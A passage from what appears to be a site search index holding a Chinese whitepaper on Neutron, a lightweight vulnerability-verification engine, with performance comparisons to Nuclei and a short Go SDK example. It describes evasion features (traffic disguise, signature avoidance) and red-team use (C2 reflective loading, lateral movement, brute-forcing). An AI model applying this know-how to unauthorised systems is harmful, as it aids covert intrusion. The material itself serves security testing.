<p>\u4ee3\u7406\u6a21\u5f0f\u652f\u6301\uff1a\u5168\u9762\u652f\u6301\u5e26\u6709\u8eab\u4efd\u8ba4\u8bc1\u673a\u5236\u7684HTTP(S)\u548cSOCKS\u4ee3\u7406\uff0c\u7279\u522b\u9002\u7528\u4e8e\u9700\u8981\u901a\u8fc7\u4ee3\u7406\u8fdb\u884c\u6f0f\u6d1e\u68c0\u6d4b\u7684\u590d\u6742\u7f51\u7edc\u73af\u5883\u3002\u4ee3\u7406\u652f\u6301\u5305\u62ec\u4ee3\u7406\u94fe\u3001\u6545\u969c\u5207\u6362\u3001\u8d1f\u8f7d\u5747\u8861\u7b49\u9ad8\u7ea7\u529f\u80fd\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u65e0\u5bb3\u5316\u68c0\u6d4b","title":"\u65e0\u5bb3\u5316\u68c0\u6d4b","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5b89\u5168\u7b2c\u4e00\u7684\u68c0\u6d4b\u7b56\u7565","title":"\u5b89\u5168\u7b2c\u4e00\u7684\u68c0\u6d4b\u7b56\u7565","text":"<p>Neutron\u5728\u8bbe\u8ba1\u4e4b\u521d\u5c31\u5c06\u5b89\u5168\u6027\u548c\u65e0\u5bb3\u5316\u4f5c\u4e3a\u9996\u8981\u8003\u8651\u56e0\u7d20\uff0c\u786e\u4fdd\u5728\u6f0f\u6d1e\u9a8c\u8bc1\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u5bf9\u76ee\u6807\u7cfb\u7edf\u9020\u6210\u4efb\u4f55\u5f71\u54cd\uff1a</p> <p>\u6700\u5c0f\u53d1\u5305\u539f\u5219\uff1a - \u6bcf\u4e2aPOC\u90fd\u7ecf\u8fc7\u7cbe\u5fc3\u4f18\u5316\uff0c\u53ea\u53d1\u9001\u9a8c\u8bc1\u6f0f\u6d1e\u5b58\u5728\u6027\u7684\u6700\u5c11\u8bf7\u6c42 - \u907f\u514d\u66b4\u529b\u6d4b\u8bd5\u548c\u53ef\u80fd\u9020\u6210\u670d\u52a1\u4e2d\u65ad\u7684\u64cd\u4f5c - \u4f18\u5148\u4f7f\u7528\u88ab\u52a8\u68c0\u6d4b\u548c\u65f6\u5ef6\u5206\u6790\u7b49\u65e0\u5bb3\u5316\u624b\u6bb5</p> <p>\u9a8c\u8bc1\u800c\u975e\u5229\u7528\uff1a - \u4e25\u683c\u533a\u5206\u6f0f\u6d1e\u9a8c\u8bc1\u548c\u6f0f\u6d1e\u5229\u7528\uff0c\u4ec5\u9a8c\u8bc1\u6f0f\u6d1e\u5b58\u5728\u6027 - \u6240\u6709POC\u7ecf\u8fc7\u4eba\u5de5\u5ba1\u6838\uff0c\u786e\u4fdd\u4e0d\u4f1a\u5bf9\u76ee\u6807\u7cfb\u7edf\u9020\u6210\u5f71\u54cd - \u91c7\u7528\u6a21\u62df\u653b\u51fb\u800c\u975e\u771f\u5b9e\u653b\u51fb\u7684\u65b9\u5f0f\u8fdb\u884c\u9a8c\u8bc1</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5185\u7f51\u73af\u5883\u4e13\u9879\u4f18\u5316","title":"\u5185\u7f51\u73af\u5883\u4e13\u9879\u4f18\u5316","text":"<p>\u9488\u5bf9\u5185\u7f51\u73af\u5883\u7684\u7279\u6b8a\u9700\u6c42\u8fdb\u884c\u5b9a\u5236\u5316\u4f18\u5316\uff1a</p> <p>\u9ad8\u4ef7\u503c\u76ee\u6807\u4f18\u5148\uff1a - \u9ed8\u8ba4\u53e3\u4ee4\u68c0\u6d4b\uff1a\u9488\u5bf9\u5e38\u89c1\u670d\u52a1\u7684\u9ed8\u8ba4\u5bc6\u7801\u548c\u5f31\u53e3\u4ee4\u9a8c\u8bc1 - \u4fe1\u606f\u6cc4\u9732\u68c0\u6d4b\uff1a\u914d\u7f6e\u6587\u4ef6\u3001\u6e90\u7801\u3001\u8c03\u8bd5\u4fe1\u606f\u7b49\u654f\u611f\u4fe1\u606f\u6cc4\u9732 - \u6743\u9650\u63d0\u5347\u6f0f\u6d1e\uff1a\u672c\u5730\u6743\u9650\u63d0\u5347\u548c\u6a2a\u5411\u79fb\u52a8\u76f8\u5173\u6f0f\u6d1e</p> <p>\u9690\u853d\u6027\u4f18\u5316\uff1a - \u6d41\u91cf\u4f2a\u88c5\uff1a\u6a21\u62df\u6b63\u5e38\u4e1a\u52a1\u6d41\u91cf\uff0c\u907f\u514d\u89e6\u53d1\u5b89\u5168\u8bbe\u5907 - \u65f6\u95f4\u95f4\u9694\u63a7\u5236\uff1a\u5408\u7406\u63a7\u5236\u63a2\u6d4b\u9891\u7387\uff0c\u964d\u4f4e\u88ab\u53d1\u73b0\u6982\u7387 - \u7279\u5f81\u89c4\u907f\uff1a\u907f\u514d\u4f7f\u7528\u5df2\u77e5\u7684\u653b\u51fb\u7279\u5f81\u548c\u7b7e\u540d</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u9ad8\u6027\u80fd\u5904\u7406","title":"\u9ad8\u6027\u80fd\u5904\u7406","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u667a\u80fd\u5e76\u53d1\u63a7\u5236","title":"\u667a\u80fd\u5e76\u53d1\u63a7\u5236","text":"<p>Neutron\u91c7\u7528\u5148\u8fdb\u7684\u5e76\u53d1\u63a7\u5236\u7b56\u7565\uff0c\u5728\u4fdd\u8bc1\u68c0\u6d4b\u6548\u7387\u7684\u540c\u65f6\u907f\u514d\u5bf9\u76ee\u6807\u7cfb\u7edf\u9020\u6210\u538b\u529b\uff1a</p> <p>\u81ea\u9002\u5e94\u5e76\u53d1\uff1a - \u6839\u636e\u76ee\u6807\u54cd\u5e94\u65f6\u95f4\u52a8\u6001\u8c03\u6574\u5e76\u53d1\u6570 - \u667a\u80fd\u8bc6\u522b\u76ee\u6807\u627f\u8f7d\u80fd\u529b\uff0c\u907f\u514d\u8fc7\u8f7d - \u652f\u6301\u5355\u76ee\u6807\u548c\u6279\u91cf\u76ee\u6807\u7684\u4e0d\u540c\u5e76\u53d1\u7b56\u7565</p> <p>\u8d44\u6e90\u4f18\u5316\u914d\u7f6e\uff1a - \u9ed8\u8ba450\u7ebf\u7a0b\u7684\u5747\u8861\u914d\u7f6e\uff0c\u9002\u5e94\u5927\u591a\u6570\u573a\u666f - 10\u79d2\u8d85\u65f6\u8bbe\u7f6e\uff0c\u5e73\u8861\u68c0\u6d4b\u51c6\u786e\u6027\u548c\u6548\u7387 - \u6bcf\u79d2100\u8bf7\u6c42\u7684\u9891\u7387\u9650\u5236\uff0c\u907f\u514d\u89e6\u53d1\u9632\u62a4\u673a\u5236</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u7f13\u5b58\u673a\u5236","title":"\u7f13\u5b58\u673a\u5236","text":"<ul> <li>\u6a21\u677f\u7f13\u5b58\uff1a\u9884\u52a0\u8f7d\u548c\u7f13\u5b58\u5e38\u7528\u6a21\u677f</li> <li>\u7ed3\u679c\u7f13\u5b58\uff1a\u907f\u514d\u91cd\u590d\u68c0\u6d4b\u76f8\u540c\u76ee\u6807</li> <li>\u8fde\u63a5\u6c60\uff1aHTTP\u8fde\u63a5\u590d\u7528\uff0c\u51cf\u5c11\u63e1\u624b\u5f00\u9500</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5185\u5b58\u7ba1\u7406","title":"\u5185\u5b58\u7ba1\u7406","text":"<ul> <li>\u6d41\u5f0f\u5904\u7406\uff1a\u5927\u6587\u4ef6\u6d41\u5f0f\u8bfb\u53d6\uff0c\u907f\u514d\u5185\u5b58\u6ea2\u51fa</li> <li>\u5783\u573e\u56de\u6536\u4f18\u5316\uff1a\u5408\u7406\u7684\u5bf9\u8c61\u751f\u547d\u5468\u671f\u7ba1\u7406</li> <li>\u5185\u5b58\u6c60\uff1a\u590d\u7528\u5e38\u7528\u5bf9\u8c61\uff0c\u51cf\u5c11\u5185\u5b58\u5206\u914d</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u591a\u5de5\u5177\u96c6\u6210","title":"\u591a\u5de5\u5177\u96c6\u6210","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#gogo\u96c6\u6210","title":"Gogo\u96c6\u6210","text":"<p>\u5728gogo\u626b\u63cf\u5668\u4e2d\u7684\u5e94\u7528\uff1a - \u57fa\u4e8e\u6307\u7eb9\u8bc6\u522b\u7ed3\u679c\u81ea\u52a8\u8c03\u7528\u76f8\u5173POC - \u652f\u6301workflow\u6a21\u5f0f\uff0c\u5b9e\u73b0\u626b\u63cf-&gt;\u6307\u7eb9-&gt;POC\u7684\u81ea\u52a8\u5316\u6d41\u7a0b - \u6781\u5c0f\u7684\u4f53\u79ef\u589e\u52a0\uff08\u4ec5\u589e\u52a030%\uff09</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#zombie\u96c6\u6210","title":"Zombie\u96c6\u6210","text":"<p>\u5728zombie\u7206\u7834\u5de5\u5177\u4e2d\u7684\u5e94\u7528\uff1a - \u57fa\u4e8eneutron\u6a21\u677f\u5b9e\u73b0Web\u5e94\u7528\u7684\u81ea\u52a8\u5316\u7206\u7834 - \u652f\u630170+\u670d\u52a1/\u534f\u8bae\u7684\u7206\u7834\u68c0\u6d4b - \u901a\u8fc7payload\u53d8\u91cf\u5b9e\u73b0\u5b57\u5178\u751f\u6210\u5668\u96c6\u6210</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#sdk\u96c6\u6210\u793a\u4f8b","title":"SDK\u96c6\u6210\u793a\u4f8b","text":"<p>\u63d0\u4f9b\u7b80\u6d01\u7684Go\u8bed\u8a00SDK\u63a5\u53e3\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u8f7b\u677e\u96c6\u6210\u6f0f\u6d1e\u9a8c\u8bc1\u80fd\u529b\u3002\u901a\u8fc7\u51e0\u884c\u7b80\u5355\u7684\u51fd\u6570\u8c03\u7528\uff0c\u5373\u53ef\u4e3a\u73b0\u6709\u5b89\u5168\u5de5\u5177\u6dfb\u52a0\u5f3a\u5927\u7684POC\u9a8c\u8bc1\u529f\u80fd\uff0c\u65e0\u9700\u6df1\u5165\u4e86\u89e3\u5e95\u5c42\u5b9e\u73b0\u7ec6\u8282\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5e94\u7528\u573a\u666f","title":"\u5e94\u7528\u573a\u666f","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5185\u7f51\u6e17\u900f\u6d4b\u8bd5","title":"\u5185\u7f51\u6e17\u900f\u6d4b\u8bd5","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5feb\u901f\u6f0f\u6d1e\u53d1\u73b0","title":"\u5feb\u901f\u6f0f\u6d1e\u53d1\u73b0","text":"<ul> <li>\u8f7b\u91cf\u4f20\u8f93\uff1a2-3MB\u7684\u5de5\u5177\u4f53\u79ef\u4fbf\u4e8e\u5185\u7f51\u4f20\u8f93</li> <li>\u5feb\u901f\u90e8\u7f72\uff1a\u5355\u6587\u4ef6\u6267\u884c\uff0c\u65e0\u9700\u5b89\u88c5\u548c\u914d\u7f6e</li> <li>\u517c\u5bb9\u6027\u5f3a\uff1a\u652f\u6301\u5404\u79cd\u7248\u672c\u7684Windows\u548cLinux\u7cfb\u7edf</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u81ea\u52a8\u5316\u6d41\u7a0b","title":"\u81ea\u52a8\u5316\u6d41\u7a0b","text":"<ul> <li>\u4e0egogo\u8054\u52a8\uff1a\u626b\u63cf-&gt;\u6307\u7eb9-&gt;POC\u7684\u81ea\u52a8\u5316\u6d41\u7a0b</li> <li>\u7ed3\u679c\u5bfc\u51fa\uff1a\u652f\u6301\u591a\u79cd\u683c\u5f0f\u7684\u7ed3\u679c\u8f93\u51fa</li> <li>\u6279\u91cf\u5904\u7406\uff1a\u652f\u6301IP\u6bb5\u548cURL\u5217\u8868\u7684\u6279\u91cf\u68c0\u6d4b</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u7ea2\u961f\u4f5c\u4e1a","title":"\u7ea2\u961f\u4f5c\u4e1a","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#c2\u96c6\u6210","title":"C2\u96c6\u6210","text":"<ul> <li>\u65e0\u6587\u4ef6\u6267\u884c\uff1a\u901a\u8fc7C2\u6846\u67b6\u53cd\u5c04\u52a0\u8f7d\uff0c\u907f\u514d\u6587\u4ef6\u843d\u5730</li> <li>\u5185\u5b58\u626b\u63cf\uff1a\u5728\u5185\u5b58\u4e2d\u5b8c\u6210\u6f0f\u6d1e\u68c0\u6d4b\uff0c\u63d0\u9ad8\u9690\u853d\u6027</li> <li>\u5206\u5e03\u5f0f\u68c0\u6d4b\uff1a\u591a\u4e2a\u8282\u70b9\u534f\u540c\u8fdb\u884c\u6f0f\u6d1e\u626b\u63cf</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u540e\u6e17\u900f\u9636\u6bb5","title":"\u540e\u6e17\u900f\u9636\u6bb5","text":"<ul> <li>\u6743\u9650\u63d0\u5347\uff1a\u68c0\u6d4b\u672c\u5730\u6743\u9650\u63d0\u5347\u6f0f\u6d1e</li> <li>\u6a2a\u5411\u79fb\u52a8\uff1a\u53d1\u73b0\u5185\u7f51\u670d\u52a1\u6f0f\u6d1e\uff0c\u8f85\u52a9\u6a2a\u5411\u79fb\u52a8</li> <li>\u4fe1\u606f\u6536\u96c6\uff1a\u81ea\u52a8\u5316\u7684\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u68c0\u6d4b</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u81ea\u52a8\u5316\u5b89\u5168\u68c0\u6d4b","title":"\u81ea\u52a8\u5316\u5b89\u5168\u68c0\u6d4b","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#cicd\u96c6\u6210","title":"CI/CD\u96c6\u6210","text":"<ul> <li>\u5bb9\u5668\u626b\u63cf\uff1a\u5728Docker\u5bb9\u5668\u4e2d\u8fdb\u884c\u5e94\u7528\u5b89\u5168\u68c0\u6d4b</li> <li>\u5feb\u901f\u68c0\u6d4b\uff1a\u79d2\u7ea7\u542f\u52a8\uff0c\u5206\u949f\u7ea7\u5b8c\u6210\u5e38\u89c1\u6f0f\u6d1e\u68c0\u6d4b</li> <li>\u8f7b\u91cf\u955c\u50cf\uff1a\u663e\u8457\u51cf\u5c11Docker\u955c\u50cf\u5927\u5c0f</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5927\u89c4\u6a21\u626b\u63cf","title":"\u5927\u89c4\u6a21\u626b\u63cf","text":"<ul> <li>\u5206\u5e03\u5f0f\u90e8\u7f72\uff1a\u591a\u8282\u70b9\u534f\u540c\u626b\u63cf\u5927\u91cf\u76ee\u6807</li> <li>\u8d44\u6e90\u9ad8\u6548\uff1a\u5355\u8282\u70b9\u53ef\u5904\u7406\u66f4\u591a\u76ee\u6807</li> <li>\u7ed3\u679c\u805a\u5408\uff1a\u7edf\u4e00\u7684\u7ed3\u679c\u6536\u96c6\u548c\u5206\u6790</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5b89\u5168\u4ea7\u54c1\u96c6\u6210","title":"\u5b89\u5168\u4ea7\u54c1\u96c6\u6210","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u4f5c\u4e3a\u7ec4\u4ef6\u96c6\u6210","title":"\u4f5c\u4e3a\u7ec4\u4ef6\u96c6\u6210","text":"<ul> <li>SDK\u5f62\u5f0f\uff1a\u4f5c\u4e3a\u5e93\u96c6\u6210\u5230\u5176\u4ed6\u5b89\u5168\u4ea7\u54c1\u4e2d</li> <li>\u5fae\u670d\u52a1\uff1a\u4f5c\u4e3a\u5fae\u670d\u52a1\u63d0\u4f9b\u6f0f\u6d1e\u68c0\u6d4b\u80fd\u529b</li> <li>\u63d2\u4ef6\u5f62\u5f0f\uff1a\u4e3a\u73b0\u6709\u5de5\u5177\u63d0\u4f9b\u6f0f\u6d1e\u68c0\u6d4b\u63d2\u4ef6</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5b9a\u5236\u5316\u5f00\u53d1","title":"\u5b9a\u5236\u5316\u5f00\u53d1","text":"<ul> <li>\u884c\u4e1a\u5b9a\u5236\uff1a\u9488\u5bf9\u7279\u5b9a\u884c\u4e1a\u7684\u6f0f\u6d1e\u68c0\u6d4b\u9700\u6c42</li> <li>\u5408\u89c4\u68c0\u6d4b\uff1a\u57fa\u4e8e\u5408\u89c4\u8981\u6c42\u7684\u5b89\u5168\u68c0\u6d4b</li> <li>\u5a01\u80c1\u60c5\u62a5\uff1a\u7ed3\u5408\u5a01\u80c1\u60c5\u62a5\u7684\u5b9a\u5411\u68c0\u6d4b</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6027\u80fd\u5bf9\u6bd4","title":"\u6027\u80fd\u5bf9\u6bd4","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u4f53\u79ef\u5bf9\u6bd4","title":"\u4f53\u79ef\u5bf9\u6bd4","text":"\u5de5\u5177 \u539f\u59cb\u5927\u5c0f \u538b\u7f29\u540e\u5927\u5c0f \u8fd0\u884c\u5185\u5b58 Nuclei v3 45MB 15MB 100MB+ Nuclei v2 25MB 8MB 50MB+ Neutron 3MB 1MB 10MB Neutron(\u6781\u7b80) 2MB 700KB 5MB"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u517c\u5bb9\u6027\u5bf9\u6bd4","title":"\u517c\u5bb9\u6027\u5bf9\u6bd4","text":"\u7279\u6027 Nuclei v3 Nuclei v2 Neutron Windows XP \u274c \u274c \u2705 Windows 7 \u274c \u2705 \u2705 Windows 10+ \u2705 \u2705 \u2705 Linux (\u8001\u7248\u672c) \u274c \u2705 \u2705 ARM\u67b6\u6784 \u2705 \u2705 \u2705"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u529f\u80fd\u8986\u76d6","title":"\u529f\u80fd\u8986\u76d6","text":"\u529f\u80fd\u7c7b\u522b Nuclei v2 Neutron \u8986\u76d6\u7387 HTTP\u6a21\u677f \u2705 \u2705 95% TCP\u6a21\u677f \u2705 \u2705 90% DSL\u51fd\u6570 \u2705 \u2705 80% \u53d8\u91cf\u7cfb\u7edf \u2705 \u2705 95% \u5339\u914d\u5668 \u2705 \u2705 100% \u63d0\u53d6\u5668 \u2705 \u2705 95%"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6027\u80fd\u6d4b\u8bd5","title":"\u6027\u80fd\u6d4b\u8bd5","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u542f\u52a8\u65f6\u95f4","title":"\u542f\u52a8\u65f6\u95f4","text":"<ul> <li>Nuclei v3: 5-8\u79d2</li> <li>Nuclei v2: 3-5\u79d2  </li> <li>Neutron: &lt;1\u79d2</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5185\u5b58\u5360\u7528\u626b\u63cf1000\u4e2a\u76ee\u6807","title":"\u5185\u5b58\u5360\u7528\uff08\u626b\u63cf1000\u4e2a\u76ee\u6807\uff09","text":"<ul> <li>Nuclei v3: 200MB+</li> <li>Nuclei v2: 100MB+</li> <li>Neutron: 20MB</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u626b\u63cf\u901f\u5ea6\u76f8\u540cpoc\u96c6\u5408","title":"\u626b\u63cf\u901f\u5ea6\uff08\u76f8\u540cPOC\u96c6\u5408\uff09","text":"<ul> <li>Nuclei v2: 100\u76ee\u6807/\u5206\u949f</li> <li>Neutron: 150\u76ee\u6807/\u5206\u949f\uff0850%\u63d0\u5347\uff09</li> </ul>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6280\u672f\u4f18\u52bf","title":"\u6280\u672f\u4f18\u52bf","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u67b6\u6784\u4f18\u52bf","title":"\u67b6\u6784\u4f18\u52bf","text":"<ol> <li> <p>\u6781\u7b80\u8bbe\u8ba1    \u901a\u8fc7\u7cbe\u786e\u7684\u529f\u80fd\u88c1\u526a\uff0c\u53bb\u966490%\u7684\u5197\u4f59\u529f\u80fd\uff0c\u4fdd\u7559\u6838\u5fc3\u7684\u6f0f\u6d1e\u68c0\u6d4b\u80fd\u529b\uff0c\u5b9e\u73b0\u6781\u81f4\u7684\u8f7b\u91cf\u5316\u3002</p> </li> <li> <p>\u96f6\u4f9d\u8d56    \u5b8c\u5168\u81ea\u5305\u542b\u7684\u8bbe\u8ba1\uff0c\u65e0\u9700\u4efb\u4f55\u5916\u90e8\u4f9d\u8d56\uff0c\u786e\u4fdd\u5728\u5404\u79cd\u73af\u5883\u4e2d\u7684\u7a33\u5b9a\u8fd0\u884c\u3002</p> </li> <li> <p>\u9ad8\u517c\u5bb9\u6027    \u5411\u4e0b\u517c\u5bb9\u5230Windows XP/2003\uff0c\u5411\u4e0a\u652f\u6301\u6700\u65b0\u64cd\u4f5c\u7cfb\u7edf\uff0c\u786e\u4fdd\u5e7f\u6cdb\u7684\u9002\u7528\u6027\u3002</p> </li> <li> <p>\u6a21\u5757\u5316    \u6838\u5fc3\u5f15\u64ce\u4e0e\u5e94\u7528\u903b\u8f91\u5206\u79bb\uff0c\u652f\u6301\u7075\u6d3b\u7684\u5b9a\u5236\u548c\u6269\u5c55\u3002</p> </li> </ol>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6027\u80fd\u4f18\u52bf","title":"\u6027\u80fd\u4f18\u52bf","text":"<ol> <li> <p>\u542f\u52a8\u6781\u5feb    \u79d2\u7ea7\u542f\u52a8\u65f6\u95f4\uff0c\u76f8\u6bd4\u4e3b\u6d41\u5de5\u5177\u63d0\u534780%\u4ee5\u4e0a\u3002</p> </li> <li> <p>\u5185\u5b58\u9ad8\u6548    \u5185\u5b58\u5360\u7528\u51cf\u5c1190%\uff0c\u9002\u7528\u4e8e\u8d44\u6e90\u53d7\u9650\u73af\u5883\u3002</p> </li> <li> <p>\u5904\u7406\u9ad8\u6548    \u4f18\u5316\u7684\u7b97\u6cd5\u548c\u6570\u636e\u7ed3\u6784\uff0c\u5904\u7406\u901f\u5ea6\u63d0\u534750%\u3002</p> </li> </ol>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u96c6\u6210\u4f18\u52bf","title":"\u96c6\u6210\u4f18\u52bf","text":"<ol> <li> <p>SDK\u5f62\u5f0f    \u539f\u751fGo\u5e93\uff0c\u51e0\u884c\u4ee3\u7801\u5373\u53ef\u96c6\u6210\u6f0f\u6d1e\u68c0\u6d4b\u80fd\u529b\u3002</p> </li> <li> <p>\u5d4c\u5165\u53cb\u597d    \u652f\u6301\u53cd\u5c04\u52a0\u8f7d\u3001\u9759\u6001\u94fe\u63a5\u7b49\u591a\u79cd\u96c6\u6210\u65b9\u5f0f\u3002</p> </li> <li> <p>\u751f\u6001\u517c\u5bb9    \u6700\u5927\u7a0b\u5ea6\u517c\u5bb9Nuclei\u751f\u6001\uff0c\u964d\u4f4e\u8fc1\u79fb\u6210\u672c\u3002</p> </li> </ol>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u96c6\u6210","title":"\u96c6\u6210","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#sdk\u96c6\u6210","title":"SDK\u96c6\u6210","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5d4c\u5165\u5f0f\u5e93\u7279\u6027","title":"\u5d4c\u5165\u5f0f\u5e93\u7279\u6027","text":"<p>Neutron\u7684\u6838\u5fc3\u4ef7\u503c\u4e4b\u4e00\u662f\u5176\u4f5c\u4e3a\u5d4c\u5165\u5f0f\u5e93\u7684\u7279\u6027\uff0c\u652f\u6301\u591a\u79cd\u96c6\u6210\u65b9\u5f0f\u4ee5\u6ee1\u8db3\u4e0d\u540c\u5e94\u7528\u573a\u666f\u7684\u9700\u6c42\u3002\u4f5c\u4e3a\u4e00\u4e2a\u771f\u6b63\u7684\u5d4c\u5165\u5f0f\u6f0f\u6d1e\u9a8c\u8bc1\u5f15\u64ce\uff0cNeutron\u63d0\u4f9b\u4e86\u5b8c\u6574\u7684SDK\u3001API\u548cABI\u63a5\u53e3\u652f\u6301\u3002</p> <p>Go SDK\u96c6\u6210\uff1a\u4f5c\u4e3a\u539f\u751fGo\u5e93\uff0cNeutron\u63d0\u4f9b\u4e86\u5b8c\u6574\u7684SDK\u63a5\u53e3\u3002\u5f00\u53d1\u8005\u53ef\u4ee5\u901a\u8fc7\u51e0\u884c\u7b80\u5355\u7684\u4ee3\u7801\u4e3a\u73b0\u6709\u5b89\u5168\u5de5\u5177\u96c6\u6210\u5f3a\u5927\u7684\u6f0f\u6d1e\u9a8c\u8bc1\u80fd\u529b\uff0c\u65e0\u9700\u6df1\u5165\u4e86\u89e3\u5e95\u5c42\u7684\u6a21\u677f\u89e3\u6790\u548c\u6267\u884c\u903b\u8f91\u3002</p> <pre><code>package main\n\nimport (\n    \"github.com/chainreactors/neutron\"\n    \"fmt\"\n)\n\nfunc main() {\n    // \u521d\u59cb\u5316\u5f15\u64ce\n    engine := neutron.NewEngine()\n\n    // \u52a0\u8f7dPOC\u6a21\u677f\n    template, _ := neutron.LoadTemplate(\"cve-2021-44228.yaml\")\n\n    // \u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\n    result, _ := engine.Execute(template, \"https://target.com\")\n\n    if result.Matched {\n        fmt.Printf(\"\u53d1\u73b0\u6f0f\u6d1e: %s (\u4e25\u91cd\u7a0b\u5ea6: %s)\\n\", \n            result.Info.Name, result.Info.Severity)\n    }\n}\n</code></pre> <p>API\u63a5\u53e3\u652f\u6301\uff1aNeutron\u63d0\u4f9bRESTful 